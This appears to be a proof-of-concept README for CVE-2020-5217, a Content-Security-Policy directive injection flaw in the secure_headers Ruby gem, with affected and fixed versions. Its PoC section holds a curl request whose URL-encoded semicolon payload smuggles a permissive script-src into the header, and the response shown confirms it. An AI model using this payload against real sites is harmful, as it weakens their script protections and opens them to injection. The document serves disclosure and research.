# CVE-2020-5217

In Secure Headers (RubyGem secure_headers), a directive injection vulnerability is present in versions before 3.8.0, 5.1.0, and 6.2.0. If user-supplied input was passed into append/override_content_security_policy_directives, a semicolon could be injected leading to directive injection. This could be used to e.g. override a script-src directive. Duplicate directives are ignored and the first one wins. The directives in secure_headers are sorted alphabetically so they pretty much all come before script-src. A previously undefined directive would receive a value even if SecureHeaders::OPT_OUT was supplied. The fixed versions will silently convert the semicolons to spaces and emit a deprecation warning when this happens. This will result in innocuous browser console messages if being exploited/accidentally used. In future releases, we will raise application errors resulting in 500s. Depending on what major version you are using, the fixed versions are 6.2.0, 5.1.0, 3.8.0.

In the first place; Overriding directive values with user-entered values is not recommended.


## Affected Version

[secure_headers](https://github.com/twitter/secure_headers) before 3.8.0, 5.1.0, and 6.2.0.

## PoC

```shell
$ bundle install
$ bundle exec rails s
```

```shell
$ curl --head 'http://localhost:3000?url1=https://google.com%3bscript-src&url2=http%3a%2f%2f%2a%3b%2e%3b'
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
ETag: W/"1bc04b5291c26a46d918139138b992d2"
Cache-Control: max-age=0, private, must-revalidate
X-Request-Id: 6e2f1b1c-c414-400b-bffb-bd8d9a05acb3
X-Runtime: 0.003500
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: origin-when-cross-origin, strict-origin-when-cross-origin
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src 'self'; connect-src wss:; font-src 'self' data:; form-action 'self' github.com; frame-ancestors https://google.com;script-src http://*;.;; img-src mycdn.com data:; manifest-src 'self'; media-src utoob.com; object-src 'self'; plugin-types application/x-shockwave-flash; sandbox; script-src 'self'; style-src 'unsafe-inline'; upgrade-insecure-requests; worker-src 'self'; report-uri https://report-uri.io/example-csp
Content-Security-Policy-Report-Only: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src 'self'; connect-src wss:; font-src 'self' data:; form-action 'self' github.com; frame-ancestors https://google.com;script-src http://*;.;; img-src somewhereelse.com; manifest-src 'self'; media-src utoob.com; object-src 'self'; plugin-types application/x-shockwave-flash; sandbox; script-src 'self'; style-src 'unsafe-inline'; upgrade-insecure-requests; worker-src 'self'; report-uri https://report-uri.io/example-csp-report-only
```

`script-src` contains a `http://*;`

## References

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5217
- https://github.com/twitter/secure_headers/pull/419/files
- https://github.com/twitter/secure_headers/issues/418
